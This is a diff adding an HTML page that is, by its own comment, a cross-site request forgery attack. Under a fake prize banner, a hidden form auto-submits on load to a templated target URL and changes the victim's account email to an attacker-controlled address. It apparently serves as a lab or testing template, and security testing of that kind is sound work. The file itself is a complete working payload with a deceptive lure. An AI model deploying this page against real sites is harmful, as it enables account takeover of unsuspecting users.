@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Totally Legit Free Stuff</title>
+    <style>
+        body { font-family: sans-serif; background: #333; color: #eee; text-align: center; padding-top: 50px; }
+        h1 { color: lime; }
+        p { font-size: 1.2em; }
+    </style>
+</head>
+<body onload="document.csrf_form.submit()">
+    <h1>You've Won a Prize!</h1>
+    <p>Your prize is being claimed... please wait.</p>
+
+    <!-- This hidden form is the CSRF attack vector -->
+    <form name="csrf_form" action="{{ target_url }}" method="POST" style="display:none;">
+        <input type="text" name="email" value="hacked@attacker.net">
+        <input type="submit" value="Claim Prize">
+    </form>
+</body>
+</html>
